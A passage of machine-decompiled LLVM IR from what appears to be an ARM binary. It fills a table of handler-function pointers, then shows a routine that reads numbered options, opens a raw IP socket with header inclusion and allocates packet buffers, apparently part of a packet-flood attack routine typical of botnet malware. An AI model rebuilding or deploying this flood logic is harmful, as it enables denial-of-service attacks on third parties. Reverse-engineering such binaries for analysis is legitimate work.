  %v0_b234 = load i32, i32* %r5.global-to-local, align 4
  %v5_b234 = mul nuw nsw i32 %v3_b22c, 4
  %v6_b234 = add i32 %v5_b234, %v7_b228
  %v7_b234 = inttoptr i32 %v6_b234 to i32*
  store i32 %v0_b234, i32* %v7_b234, align 4
  %v0_b238 = load i32, i32* %r3.global-to-local, align 4
  %v1_b238 = load i32, i32* %r8.global-to-local, align 4
  %v2_b238 = add i32 %v1_b238, %v0_b238
  store i32 %v2_b238, i32* %r2.global-to-local, align 4
  %v0_b23c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_b23c, i32* %r1.global-to-local, align 4
  %v0_b244 = load i32, i32* %ip.global-to-local, align 4
  %v1_b244 = load i32, i32* %r6.global-to-local, align 4
  %v2_b244 = inttoptr i32 %v1_b244 to i32*
  store i32 %v0_b244, i32* %v2_b244, align 4
  %v0_b248 = load i32, i32* %r2.global-to-local, align 4
  %v1_b248 = trunc i32 %v0_b248 to i8
  %v2_b248 = load i32, i32* %r4.global-to-local, align 4
  %v3_b248 = inttoptr i32 %v2_b248 to i8*
  store i8 %v1_b248, i8* %v3_b248, align 1
  %v2_b24c = call i32* @calloc(i32 %v1_b238, i32 %v0_b23c)
  %v4_b24c = ptrtoint i32* %v2_b24c to i32
  %v2_b250 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b250 = zext i8 %v2_b250 to i32
  store i32 ptrtoint (i32* @global_var_c288.127 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b24c, i32* %r5.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_b260 = mul nuw nsw i32 %v3_b250, 4
  store i32 %v3_b260, i32* %r1.global-to-local, align 4
  %v2_b264 = load i32, i32* @global_var_1c1c0.110, align 4
  store i32 ptrtoint (i32* @global_var_c288.127 to i32), i32* %v2_b24c, align 4
  %v0_b26c = load i32, i32* %r3.global-to-local, align 4
  %v1_b26c = trunc i32 %v0_b26c to i8
  %v2_b26c = load i32, i32* %r5.global-to-local, align 4
  %v3_b26c = add i32 %v2_b26c, 4
  %v4_b26c = inttoptr i32 %v3_b26c to i8*
  store i8 %v1_b26c, i8* %v4_b26c, align 1
  %v0_b270 = load i32, i32* %r1.global-to-local, align 4
  %v1_b270 = add i32 %v0_b270, 4
  store i32 %v1_b270, i32* %r1.global-to-local, align 4
  %v4_b274 = inttoptr i32 %v2_b264 to i32*
  %v5_b274 = call i32* @realloc(i32* %v4_b274, i32 %v1_b270)
  %v7_b274 = ptrtoint i32* %v5_b274 to i32
  %v2_b278 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b278 = zext i8 %v2_b278 to i32
  store i32 %v3_b278, i32* %r3.global-to-local, align 4
  store i32 %v7_b274, i32* %ip.global-to-local, align 4
  %v0_b280 = load i32, i32* %r5.global-to-local, align 4
  %v5_b280 = mul nuw nsw i32 %v3_b278, 4
  %v6_b280 = add i32 %v5_b280, %v7_b274
  %v7_b280 = inttoptr i32 %v6_b280 to i32*
  store i32 %v0_b280, i32* %v7_b280, align 4
  %v0_b284 = load i32, i32* %r3.global-to-local, align 4
  %v1_b284 = load i32, i32* %r8.global-to-local, align 4
  %v2_b284 = add i32 %v1_b284, %v0_b284
  store i32 %v2_b284, i32* %r2.global-to-local, align 4
  %v0_b288 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_b288, i32* %r1.global-to-local, align 4
  %v0_b290 = load i32, i32* %ip.global-to-local, align 4
  %v1_b290 = load i32, i32* %r6.global-to-local, align 4
  %v2_b290 = inttoptr i32 %v1_b290 to i32*
  store i32 %v0_b290, i32* %v2_b290, align 4
  %v0_b294 = load i32, i32* %r2.global-to-local, align 4
  %v1_b294 = trunc i32 %v0_b294 to i8
  %v2_b294 = load i32, i32* %r4.global-to-local, align 4
  %v3_b294 = inttoptr i32 %v2_b294 to i8*
  store i8 %v1_b294, i8* %v3_b294, align 1
  %v2_b298 = call i32* @calloc(i32 %v1_b284, i32 %v0_b288)
  %v4_b298 = ptrtoint i32* %v2_b298 to i32
  %v2_b29c = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b29c = zext i8 %v2_b29c to i32
  store i32 ptrtoint (i32* @global_var_bb50.129 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b298, i32* %r5.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_b2ac = mul nuw nsw i32 %v3_b29c, 4
  store i32 %v3_b2ac, i32* %r1.global-to-local, align 4
  %v2_b2b0 = load i32, i32* @global_var_1c1c0.110, align 4
  store i32 ptrtoint (i32* @global_var_bb50.129 to i32), i32* %v2_b298, align 4
  %v0_b2b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2b8 = trunc i32 %v0_b2b8 to i8
  %v2_b2b8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b2b8 = add i32 %v2_b2b8, 4
  %v4_b2b8 = inttoptr i32 %v3_b2b8 to i8*
  store i8 %v1_b2b8, i8* %v4_b2b8, align 1
  %v0_b2bc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2bc = add i32 %v0_b2bc, 4
  store i32 %v1_b2bc, i32* %r1.global-to-local, align 4
  %v4_b2c0 = inttoptr i32 %v2_b2b0 to i32*
  %v5_b2c0 = call i32* @realloc(i32* %v4_b2c0, i32 %v1_b2bc)
  %v7_b2c0 = ptrtoint i32* %v5_b2c0 to i32
  %v2_b2c4 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b2c4 = zext i8 %v2_b2c4 to i32
  store i32 %v3_b2c4, i32* %r3.global-to-local, align 4
  store i32 %v7_b2c0, i32* %ip.global-to-local, align 4
  %v0_b2cc = load i32, i32* %r5.global-to-local, align 4
  %v5_b2cc = mul nuw nsw i32 %v3_b2c4, 4
  %v6_b2cc = add i32 %v5_b2cc, %v7_b2c0
  %v7_b2cc = inttoptr i32 %v6_b2cc to i32*
  store i32 %v0_b2cc, i32* %v7_b2cc, align 4
  %v0_b2d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_b2d0 = add i32 %v1_b2d0, %v0_b2d0
  store i32 %v2_b2d0, i32* %r2.global-to-local, align 4
  %v0_b2d4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_b2d4, i32* %r1.global-to-local, align 4
  %v0_b2dc = load i32, i32* %ip.global-to-local, align 4
  %v1_b2dc = load i32, i32* %r6.global-to-local, align 4
  %v2_b2dc = inttoptr i32 %v1_b2dc to i32*
  store i32 %v0_b2dc, i32* %v2_b2dc, align 4
  %v0_b2e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2e0 = trunc i32 %v0_b2e0 to i8
  %v2_b2e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b2e0 = inttoptr i32 %v2_b2e0 to i8*
  store i8 %v1_b2e0, i8* %v3_b2e0, align 1
  %v2_b2e4 = call i32* @calloc(i32 %v1_b2d0, i32 %v0_b2d4)
  %v4_b2e4 = ptrtoint i32* %v2_b2e4 to i32
  %v2_b2e8 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b2e8 = zext i8 %v2_b2e8 to i32
  store i32 ptrtoint (i32* @global_var_b3a8.131 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b2e4, i32* %r5.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_b2f8 = mul nuw nsw i32 %v3_b2e8, 4
  store i32 %v3_b2f8, i32* %r1.global-to-local, align 4
  %v2_b2fc = load i32, i32* @global_var_1c1c0.110, align 4
  store i32 ptrtoint (i32* @global_var_b3a8.131 to i32), i32* %v2_b2e4, align 4
  %v0_b304 = load i32, i32* %r3.global-to-local, align 4
  %v1_b304 = trunc i32 %v0_b304 to i8
  %v2_b304 = load i32, i32* %r5.global-to-local, align 4
  %v3_b304 = add i32 %v2_b304, 4
  %v4_b304 = inttoptr i32 %v3_b304 to i8*
  store i8 %v1_b304, i8* %v4_b304, align 1
  %v0_b308 = load i32, i32* %r1.global-to-local, align 4
  %v1_b308 = add i32 %v0_b308, 4
  store i32 %v1_b308, i32* %r1.global-to-local, align 4
  %v4_b30c = inttoptr i32 %v2_b2fc to i32*
  %v5_b30c = call i32* @realloc(i32* %v4_b30c, i32 %v1_b308)
  %v7_b30c = ptrtoint i32* %v5_b30c to i32
  %v2_b310 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b310 = zext i8 %v2_b310 to i32
  store i32 %v3_b310, i32* %r3.global-to-local, align 4
  store i32 %v7_b30c, i32* %ip.global-to-local, align 4
  %v0_b318 = load i32, i32* %r5.global-to-local, align 4
  %v5_b318 = mul nuw nsw i32 %v3_b310, 4
  %v6_b318 = add i32 %v5_b318, %v7_b30c
  %v7_b318 = inttoptr i32 %v6_b318 to i32*
  store i32 %v0_b318, i32* %v7_b318, align 4
  %v0_b31c = load i32, i32* %r3.global-to-local, align 4
  %v1_b31c = load i32, i32* %r8.global-to-local, align 4
  %v2_b31c = add i32 %v1_b31c, %v0_b31c
  store i32 %v2_b31c, i32* %r2.global-to-local, align 4
  %v0_b320 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_b320, i32* %r1.global-to-local, align 4
  %v1_b328 = trunc i32 %v2_b31c to i8
  %v2_b328 = load i32, i32* %r4.global-to-local, align 4
  %v3_b328 = inttoptr i32 %v2_b328 to i8*
  store i8 %v1_b328, i8* %v3_b328, align 1
  %v0_b32c = load i32, i32* %ip.global-to-local, align 4
  %v1_b32c = load i32, i32* %r6.global-to-local, align 4
  %v2_b32c = inttoptr i32 %v1_b32c to i32*
  store i32 %v0_b32c, i32* %v2_b32c, align 4
  %v2_b330 = call i32* @calloc(i32 %v1_b31c, i32 %v0_b320)
  %v4_b330 = ptrtoint i32* %v2_b330 to i32
  %v2_b334 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b334 = zext i8 %v2_b334 to i32
  store i32 ptrtoint (i32* @global_var_8e9c.133 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b330, i32* %r5.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v3_b344 = mul nuw nsw i32 %v3_b334, 4
  store i32 %v3_b344, i32* %r1.global-to-local, align 4
  %v2_b348 = load i32, i32* @global_var_1c1c0.110, align 4
  store i32 ptrtoint (i32* @global_var_8e9c.133 to i32), i32* %v2_b330, align 4
  %v0_b350 = load i32, i32* %r3.global-to-local, align 4
  %v1_b350 = trunc i32 %v0_b350 to i8
  %v2_b350 = load i32, i32* %r5.global-to-local, align 4
  %v3_b350 = add i32 %v2_b350, 4
  %v4_b350 = inttoptr i32 %v3_b350 to i8*
  store i8 %v1_b350, i8* %v4_b350, align 1
  %v0_b354 = load i32, i32* %r1.global-to-local, align 4
  %v1_b354 = add i32 %v0_b354, 4
  store i32 %v1_b354, i32* %r1.global-to-local, align 4
  %v4_b358 = inttoptr i32 %v2_b348 to i32*
  %v5_b358 = call i32* @realloc(i32* %v4_b358, i32 %v1_b354)
  %v6_b358 = ptrtoint i32* %v5_b358 to i32
  %v2_b35c = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b35c = zext i8 %v2_b35c to i32
  store i32 %v3_b35c, i32* %r3.global-to-local, align 4
  %v1_b360 = load i32, i32* %r6.global-to-local, align 4
  %v2_b360 = inttoptr i32 %v1_b360 to i32*
  store i32 %v6_b358, i32* %v2_b360, align 4
  %v0_b364 = load i32, i32* %r5.global-to-local, align 4
  %v2_b364 = load i32, i32* %r3.global-to-local, align 4
  %v5_b364 = mul i32 %v2_b364, 4
  %v6_b364 = add i32 %v5_b364, %v6_b358
  %v7_b364 = inttoptr i32 %v6_b364 to i32*
  store i32 %v0_b364, i32* %v7_b364, align 4
  %v0_b368 = load i32, i32* %r3.global-to-local, align 4
  %v1_b368 = load i32, i32* %r8.global-to-local, align 4
  %v2_b368 = add i32 %v1_b368, %v0_b368
  store i32 %v2_b368, i32* %r2.global-to-local, align 4
  %v1_b370 = trunc i32 %v2_b368 to i8
  %v2_b370 = load i32, i32* %r4.global-to-local, align 4
  %v3_b370 = inttoptr i32 %v2_b370 to i8*
  store i8 %v1_b370, i8* %v3_b370, align 1
  %v2_b374 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b374, i32* @r4, align 4
  ret i32 %v1_b368

; uselistorder directives
  uselistorder i32 %v1_b368, { 1, 0 }
  uselistorder i32 %v1_b31c, { 1, 0 }
  uselistorder i32 %v1_b2d0, { 1, 0 }
  uselistorder i32 %v1_b284, { 1, 0 }
  uselistorder i32 %v1_b238, { 1, 0 }
  uselistorder i32 %v1_b1ec, { 1, 0 }
  uselistorder i32 %v1_b1a0, { 1, 0 }
  uselistorder i32 %v3_b148, { 1, 0, 2 }
  uselistorder i32 %v1_b108, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 10 }
  uselistorder i32* %r6.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 10 }
  uselistorder i32* %r5.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 10 }
  uselistorder i32* %r3.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 24, 19, 20, 21, 22, 23, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %ip.global-to-local, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* @global_var_1c1c0.110, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i8* bitcast (i8** @global_var_1c1bc.108 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_b3a8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_b3a8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-50 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_b3a8 = load i32, i32* @r4, align 4
  %v6_b3a8 = load i32, i32* @r5, align 4
  %v9_b3a8 = load i32, i32* @r6, align 4
  %v12_b3a8 = load i32, i32* @r7, align 4
  %v15_b3a8 = load i32, i32* @r8, align 4
  %v21_b3a8 = load i32, i32* @sl, align 4
  %v24_b3a8 = load i32, i32* @fp, align 4
  %v1_b3ac = urem i32 %arg2, 256
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v1_b3ac, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b3c8 = urem i32 %arg4, 256
  store i32 %v1_b3c8, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v2_b3d8 = call i32* @calloc(i32 %v1_b3ac, i32 4)
  %v4_b3d8 = ptrtoint i32* %v2_b3d8 to i32
  %v0_b3dc = load i32, i32* @r5, align 4
  store i32 %v0_b3dc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_b3e8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_b3e8, i32* %r3.global-to-local, align 4
  %v0_b3ec = load i32, i32* @r4, align 4
  store i32 %v0_b3ec, i32* %r0.global-to-local, align 4
  %v5_b3f0 = inttoptr i32 %v0_b3dc to i32*
  %v6_b3f0 = call i32 @function_ad24(i32 %v0_b3ec, i32* %v5_b3f0, i32 2, i32 %v0_b3e8)
  %v1_b3fc = urem i32 %v6_b3f0, 256
  store i32 %v1_b3fc, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b408 = load i32, i32* @r5, align 4
  store i32 %v0_b408, i32* %r1.global-to-local, align 4
  %v0_b40c = load i32, i32* @r4, align 4
  store i32 %v0_b40c, i32* %r0.global-to-local, align 4
  %v5_b410 = trunc i32 %v6_b3f0 to i8
  %v6_b414 = inttoptr i32 %v0_b408 to i32*
  %v7_b414 = call i32 @function_ad24(i32 %v0_b40c, i32* %v6_b414, i32 3, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_b418 = load i32, i32* @r5, align 4
  store i32 %v0_b418, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b414, i32* @r7, align 4
  %v0_b428 = load i32, i32* @r4, align 4
  store i32 %v0_b428, i32* %r0.global-to-local, align 4
  %v4_b42c = inttoptr i32 %v0_b418 to i32*
  %v5_b42c = call i32 @function_ad24(i32 %v0_b428, i32* %v4_b42c, i32 4, i32 64)
  %v1_b434 = urem i32 %v5_b42c, 256
  store i32 %v1_b434, i32* %ip.global-to-local, align 4
  %v0_b438 = load i32, i32* @r5, align 4
  store i32 %v0_b438, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b444 = load i32, i32* @r4, align 4
  store i32 %v0_b444, i32* %r0.global-to-local, align 4
  %v5_b448 = trunc i32 %v5_b42c to i8
  %v6_b44c = inttoptr i32 %v0_b438 to i32*
  %v7_b44c = call i32 @function_ad24(i32 %v0_b444, i32* %v6_b44c, i32 5, i32 1)
  %v1_b458 = urem i32 %v7_b44c, 256
  store i32 %v1_b458, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b464 = load i32, i32* @r5, align 4
  store i32 %v0_b464, i32* %r1.global-to-local, align 4
  %v0_b468 = load i32, i32* @r4, align 4
  store i32 %v0_b468, i32* %r0.global-to-local, align 4
  %v5_b470 = inttoptr i32 %v0_b464 to i32*
  %v6_b470 = call i32 @function_ad24(i32 %v0_b468, i32* %v5_b470, i32 6, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b488 = load i32, i32* @r4, align 4
  store i32 %v0_b488, i32* %r0.global-to-local, align 4
  %v5_b48c = inttoptr i32 %v0_b47c to i32*
  %v6_b48c = call i32 @function_ad24(i32 %v0_b488, i32* %v5_b48c, i32 7, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_b490 = load i32, i32* @r5, align 4
  store i32 %v0_b490, i32* %r1.global-to-local, align 4
  %v0_b494 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_b494, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_b48c, i32* @sl, align 4
  %v0_b4a0 = load i32, i32* @r4, align 4
  store i32 %v0_b4a0, i32* %r0.global-to-local, align 4
  %v4_b4a4 = inttoptr i32 %v0_b490 to i32*
  %v5_b4a4 = call i32 @function_ad24(i32 %v0_b4a0, i32* %v4_b4a4, i32 %v0_b494, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4b4 = load i32, i32* @r5, align 4
  store i32 %v0_b4b4, i32* %r1.global-to-local, align 4
  %v0_b4b8 = load i32, i32* @r4, align 4
  store i32 %v0_b4b8, i32* %r0.global-to-local, align 4
  %v4_b4bc = inttoptr i32 %v0_b4b4 to i32*
  %v5_b4bc = call i32 @function_ad24(i32 %v0_b4b8, i32* %v4_b4bc, i32 1, i32 1)
  %v1_b4c4 = urem i32 %v5_b4bc, 256
  store i32 %v1_b4c4, i32* %ip.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r5, align 4
  store i32 %v0_b4c8, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_b4d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_b4d0, i32* %r3.global-to-local, align 4
  %v0_b4d4 = load i32, i32* @r4, align 4
  store i32 %v0_b4d4, i32* %r0.global-to-local, align 4
  %v5_b4dc = inttoptr i32 %v0_b4c8 to i32*
  %v6_b4dc = call i32 @function_ad24(i32 %v0_b4d4, i32* %v5_b4dc, i32 18, i32 %v0_b4d0)
  %v0_b4e4 = load i32, i32* @r5, align 4
  store i32 %v0_b4e4, i32* %r1.global-to-local, align 4
  %v2_b4e8 = load i32, i32* @global_var_1c21c.135, align 4
  store i32 %v2_b4e8, i32* %r3.global-to-local, align 4
  store i32 %v6_b4dc, i32* @r8, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_b4f4 = load i32, i32* @r4, align 4
  store i32 %v0_b4f4, i32* %r0.global-to-local, align 4
  %v4_b4f8 = inttoptr i32 %v0_b4e4 to i32*
  %v5_b4f8 = call i32 @function_ad24(i32 %v0_b4f4, i32* %v4_b4f8, i32 24, i32 %v2_b4e8)
  %v0_b500 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_b500, i32* %r0.global-to-local, align 4
  %v1_b504 = inttoptr i32 %v0_b500 to i32*
  %v2_b504 = call i32 @time(i32* %v1_b504)
  %v1_b508 = load i32, i32* @r6, align 4
  %v2_b508 = add i32 %v1_b508, %v2_b504
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b51c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b51c, i32* %r0.global-to-local, align 4
  %v7_b520 = icmp eq i32 %v3_b51c, -1
  store i1 %v7_b520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b520, label %dec_label_pc_bb38, label %dec_label_pc_b52c

dec_label_pc_b52c:                                ; preds = %dec_label_pc_b3a8
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b534 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b534, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b53c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_b53c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_b548 = call i32 @setsockopt(i32 %v3_b51c, i32 %v0_b53c, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_b548, i32* %r0.global-to-local, align 4
  %v7_b54c = icmp eq i32 %v7_b548, -1
  store i1 %v7_b54c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b54c, label %dec_label_pc_bb40, label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b52c
  %v0_b560 = load i32, i32* @sl, align 4
  %v3_b560 = mul i32 %v0_b560, 65536
  store i32 %v3_b560, i32* %sl.global-to-local, align 4
  %v0_b564 = load i32, i32* @r7, align 4
  %v3_b564 = mul i32 %v0_b564, 65536
  store i32 %v3_b564, i32* %r7.global-to-local, align 4
  %v2_b56c = icmp eq i32 %v1_b3ac, 0
  store i1 %v2_b56c, i1* %cpsr_z.global-to-local, align 1
  %v0_b570 = load i32, i32* @r8, align 4
  %v1_b570 = urem i32 %v0_b570, 256
  store i32 %v1_b570, i32* %r8.global-to-local, align 4
  %v3_b574 = urem i32 %v0_b564, 65536
  store i32 %v3_b574, i32* %r3.global-to-local, align 4
  %v3_b578 = urem i32 %v6_b470, 65536
  store i32 %v3_b578, i32* %r1.global-to-local, align 4
  %v3_b57c = urem i32 %v0_b560, 65536
  store i32 %v3_b57c, i32* %r2.global-to-local, align 4
  %v0_b588 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_b588, i32* %stack_var_-40, align 4
  br i1 %v2_b56c, label %dec_label_pc_b81c.preheader, label %dec_label_pc_b59c

dec_label_pc_b59c:                                ; preds = %dec_label_pc_b554
  %v3_b5a4 = mul i32 %v5_b4a4, 65536
  %v1_b5ac = urem i32 %v6_b470, 256
  %v1_b5b4 = add i32 %v3_b5a4, 524288
  %v1_b5b8 = add i32 %v3_b5a4, 4325376
  %v1_b5bc = urem i32 %v0_b560, 256
  %v1_b5c0 = add i32 %v3_b5a4, 1835008
  %v0_b564.not = or i32 %v0_b564, -65536
  %v1_b5c8 = xor i32 %v0_b564.not, 65535
  %v3_b5cc = udiv i32 %v1_b5c0, 256
  %tmp83 = udiv i32 %v0_b564, 256
  %v1_b5e0 = and i32 %v3_b5cc, 65280
  store i32 %v1_b5e0, i32* %r0.global-to-local, align 4
  %v3_b604 = mul nuw nsw i32 %v1_b5ac, 256
  %tmp84 = udiv i32 %v6_b470, 256
  %v4_b60c = urem i32 %tmp84, 256
  %v5_b60c = or i32 %v4_b60c, %v3_b604
  store i32 %v5_b60c, i32* %lr.global-to-local, align 4
  %tmp85 = mul nsw i32 %v1_b5c8, 256
  %v3_b614 = mul nuw nsw i32 %v1_b5bc, 256
  %sext24 = mul i32 %tmp83, 16777216
  %v4_b61c = sdiv i32 %sext24, 16777216
  %v4_b5e4 = sdiv i32 %v1_b5b8, 16777216
  %tmp86 = udiv i32 %v0_b560, 256
  %v4_b624 = urem i32 %tmp86, 256
  %v5_b624 = or i32 %v4_b624, %v3_b614
  store i32 %v5_b624, i32* %r7.global-to-local, align 4
  %v1_b628 = and i32 %tmp85, 65280
  store i32 %v1_b628, i32* %ip.global-to-local, align 4
  %v4_b62c = sdiv i32 %v1_b5c0, 16777216
  %v3_b630 = udiv i32 %v1_b5b4, 256
  %tmp87 = udiv i32 %v1_b5c8, 256
  %v4_b634 = urem i32 %tmp87, 256
  %v5_b634 = or i32 %v4_b634, %v1_b628
  store i32 %v5_b634, i32* %r6.global-to-local, align 4
  %v3_b638 = ashr i32 %v1_b5b8, 31
  %v3_b63c = ashr i32 %sext24, 31
  %v1_b640 = and i32 %v3_b630, 65280
  store i32 %v1_b640, i32* %r5.global-to-local, align 4
  %v3_b64c = ashr i32 %v1_b5c0, 31
  store i32 %v3_b64c, i32* %r2.global-to-local, align 4
  %v3_b65033 = udiv i32 %v1_b628, 256
  store i32 %v3_b65033, i32* %r3.global-to-local, align 4
  store i32 %v1_b5ac, i32* %r1.global-to-local, align 4
  %v4_b658 = udiv i32 %v1_b5b4, 16777216
  %v5_b658 = or i32 %v4_b658, %v1_b640
  store i32 %v5_b658, i32* %r8.global-to-local, align 4
  %v5_b65c = trunc i32 %tmp87 to i8
  store i32 %v0_b588, i32* %r4.global-to-local, align 4
  %v3_b67434 = udiv i32 %v1_b640, 256
  store i32 %v3_b67434, i32* %sl.global-to-local, align 4
  store i32 %v1_b5bc, i32* %fp.global-to-local, align 4
  %v4_b6c8 = sext i8 %v5_b448 to i32
  %sext16 = mul i32 %v1_b5c8, 16777216
  %v4_b798 = sdiv i32 %sext16, 16777216
  %v2_b7c8 = icmp eq i32 %v1_b570, 0
  %sext17 = mul i32 %v6_b470, 16777216
  %v4_b7dc = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %tmp84, 16777216
  %v4_b7f8 = sdiv i32 %sext18, 16777216
  %v1_b6e0 = trunc i32 %v4_b61c to i8
  br label %dec_label_pc_b67c

dec_label_pc_b67c:                                ; preds = %bb98, %dec_label_pc_b59c
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_b688 = call i32* @calloc(i32 1510, i32 4)
  %v4_b688 = ptrtoint i32* %v2_b688 to i32
  store i32 %v4_b688, i32* %r0.global-to-local, align 4
